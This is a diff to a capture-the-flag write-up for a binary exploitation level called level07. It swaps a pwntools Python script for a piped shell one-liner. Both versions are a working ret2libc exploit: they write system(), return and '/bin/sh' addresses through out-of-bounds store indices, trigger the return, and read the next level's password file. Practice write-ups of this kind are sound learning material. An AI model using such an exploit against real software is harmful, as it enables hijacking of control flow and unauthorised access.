@@ -66,7 +66,7 @@ Overwrite three consecutive words starting at the return address:
 
 When `main` executes its `ret`, control flows to `system("/bin/sh")`.
 
-## Exploit Commands
+## Exploit
 
 ```
 store  0xF7E6AED0  0x40000072   # system -> ret addr
@@ -76,23 +76,6 @@ quit                             # trigger ret
 cat /home/users/level08/.pass
 ```
 
-## One-liner (Python / pwntools)
-
-```python
-from pwn import ssh, p32
-
-s = ssh(host="localhost", port=4242, user="level07", password="<level07-pass>")
-p = s.run("/home/users/level07/level07")
-
-def store(val, idx):
-    p.recvuntil(b"Input command: "); p.sendline(b"store")
-    p.recvuntil(b"Number: ");        p.sendline(str(val).encode())
-    p.recvuntil(b"Index: ");         p.sendline(str(idx).encode())
-
-store(0xF7E6AED0, 0x40000072)
-store(0xF7E5EB70, 115)
-store(0xF7F897EC, 116)
-p.recvuntil(b"Input command: "); p.sendline(b"quit")
-p.sendline(b"cat /home/users/level08/.pass")
-print(p.recvrepeat(timeout=3))
-```
+## Commands
+(echo store; echo 4159090384; echo 1073741938; echo store; echo 4159040368; echo 115; echo store; echo 4160264172; echo 116; echo quit; cat) | /home/users/level07/level07
+cat /home/users/level08/.pass
